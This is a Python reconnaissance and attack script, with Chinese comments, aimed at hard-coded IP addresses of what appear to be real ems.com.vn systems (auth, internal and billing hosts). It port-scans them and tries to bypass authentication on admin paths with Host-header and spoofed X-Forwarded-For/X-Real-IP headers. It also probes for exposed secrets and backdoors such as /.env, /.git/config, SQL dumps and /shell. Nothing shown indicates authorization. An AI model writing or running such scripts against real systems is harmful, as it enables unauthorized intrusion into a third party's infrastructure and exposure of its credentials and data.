#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
快速安全测试 - 针对关键漏洞
"""

import requests
import socket
import urllib3
import concurrent.futures

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 重点测试的 IP
KEY_IPS = [
    ('222.255.250.247', 'auth.ems.com.vn'),
    ('222.255.250.234', 'internal.ems.com.vn'),
    ('222.255.250.240', 'bill.ems.com.vn')
]

print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    快速安全测试 - 真实 IP                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")

def quick_port_scan(ip):
    """快速扫描关键端口"""
    print(f"\n[*] 快速端口扫描: {ip}")
    key_ports = [21, 22, 80, 443, 445, 1433, 3306, 3389, 5432, 6379, 8080, 8443, 8888, 9000]
    open_ports = []
    
    for port in key_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex((ip, port)) == 0:
            open_ports.append(port)
            print(f"  [✓] {port}")
        sock.close()
    
    return open_ports

def test_direct_access(ip, domain):
    """测试直接 IP 访问 vs 域名访问"""
    print(f"\n[*] 测试直接访问绕过: {ip} ({domain})")
    
    # 关键管理路径
    admin_paths = ['/admin', '/admin/dashboard', '/api/admin', '/internal']
    
    for path in admin_paths:
        try:
            # 1. 直接 IP 访问
            direct_url = f"http://{ip}{path}"
            resp1 = requests.get(direct_url, timeout=3, verify=False, allow_redirects=False)
            
            # 2. 使用 Host 头访问
            resp2 = requests.get(direct_url, headers={'Host': domain}, timeout=3, verify=False, allow_redirects=False)
            
            # 3. 域名访问 (对比)
            domain_url = f"http://{domain}{path}"
            resp3 = requests.get(domain_url, timeout=3, verify=False, allow_redirects=False)
            
            print(f"\n  路径: {path}")
            print(f"    直接IP: {resp1.status_code}")
            print(f"    IP+Host: {resp2.status_code}")
            print(f"    域名访问: {resp3.status_code}")
            
            # 检查是否有差异
            if resp1.status_code != resp3.status_code:
                print(f"    [!] 发现差异！可能存在绕过")
                
        except Exception as e:
            pass

def check_trust_headers(ip):
    """检查信任头绕过"""
    print(f"\n[*] 测试信任头绕过: {ip}")
    
    trust_headers = [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'},
        {'X-Forwarded-For': '10.0.0.1'},
        {'X-Forwarded-For': '192.168.1.1'},
        {'X-Forwarded-For': '222.255.250.1'},  # 同网段
        {'X-Remote-IP': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'},
        {'Client-IP': '127.0.0.1'},
        {'X-Forwarded-Host': 'localhost'},
        {'X-Forwarded-For': 'localhost'}
    ]
    
    test_url = f"http://{ip}/admin"
    
    for headers in trust_headers:
        try:
            resp = requests.get(test_url, headers=headers, timeout=3, verify=False)
            if resp.status_code in [200, 301, 302]:
                print(f"  [!] {headers} -> {resp.status_code}")
                if resp.status_code == 200 and 'login' not in resp.text.lower():
                    print(f"      [!!!] 可能绕过了认证！")
        except:
            pass

def find_hidden_services(ip, ports):
    """在非标准端口查找服务"""
    print(f"\n[*] 检查非标准端口服务: {ip}")
    
    for port in ports:
        if port not in [80, 443]:  # 非标准端口
            for protocol in ['http', 'https']:
                try:
                    url = f"{protocol}://{ip}:{port}"
                    resp = requests.get(url, timeout=3, verify=False)
                    if resp.status_code < 500:
                        print(f"  [✓] {url} - {resp.status_code}")
                        
                        # 检查是否是管理界面
                        if any(kw in resp.text.lower() for kw in ['admin', 'login', 'dashboard']):
                            print(f"      [!] 可能是管理界面")
                            
                except:
                    pass

def test_same_network_access(base_ip):
    """测试同网段访问"""
    print(f"\n[*] 测试同网段信任: {base_ip}")
    
    # 获取网段
    parts = base_ip.split('.')
    network = '.'.join(parts[:3])
    
    # 测试几个同网段 IP
    test_ips = [
        f"{network}.228",  # 已知的双系统
        f"{network}.234",  # 内部系统
        f"{network}.240",  # 账单系统
    ]
    
    for target_ip in test_ips:
        if target_ip != base_ip:
            try:
                # 模拟从 base_ip 访问 target_ip
                headers = {
                    'X-Forwarded-For': base_ip,
                    'X-Real-IP': base_ip,
                    'X-Internal-Request': 'true'
                }
                
                resp = requests.get(f"http://{target_ip}/internal", 
                                  headers=headers, timeout=2, verify=False)
                
                if resp.status_code != 404:
                    print(f"  [*] {base_ip} -> {target_ip}: {resp.status_code}")
                    
            except:
                pass

# 执行测试
for ip, domain in KEY_IPS:
    print(f"\n{'='*60}")
    print(f"目标: {ip} ({domain})")
    print(f"{'='*60}")
    
    # 1. 端口扫描
    open_ports = quick_port_scan(ip)
    
    # 2. 测试直接访问
    test_direct_access(ip, domain)
    
    # 3. 测试信任头
    check_trust_headers(ip)
    
    # 4. 查找隐藏服务
    if open_ports:
        find_hidden_services(ip, open_ports)
    
    # 5. 测试网段信任
    test_same_network_access(ip)
    
    print(f"\n")

# 特别测试：寻找未公开的管理接口
print(f"\n{'='*60}")
print("[+] 寻找未公开的管理接口")
print(f"{'='*60}")

hidden_paths = [
    '/phpinfo.php', '/info.php', '/test.php',
    '/.git/config', '/.env', '/config.json',
    '/admin/login', '/administrator', '/manage',
    '/debug', '/status', '/health',
    '/api/internal', '/internal/api',
    '/backup', '/dump.sql', '/backup.sql',
    '/phpmyadmin', '/adminer', '/mysql',
    '/shell', '/console', '/terminal'
]

for ip, domain in KEY_IPS:
    print(f"\n{ip}:")
    for path in hidden_paths[:10]:  # 测试前10个
        try:
            resp = requests.get(f"http://{ip}{path}", timeout=2, verify=False)
            if resp.status_code in [200, 301, 302, 403]:
                print(f"  [{resp.status_code}] {path}")
                if resp.status_code == 200:
                    if 'phpinfo()' in resp.text:
                        print(f"    [!!!] PHPInfo 泄露！")
                    elif path == '/.env' and 'DB_' in resp.text:
                        print(f"    [!!!] 环境配置泄露！")
        except:
            pass

print(f"\n\n[+] 测试完成！")
print("\n关键发现总结：")
print("1. 检查各 IP 的端口差异")
print("2. 对比直接 IP 访问和域名访问的差异")  
print("3. 注意 403 状态码，说明路径存在")
print("4. 同网段 IP 可能存在内部信任关系")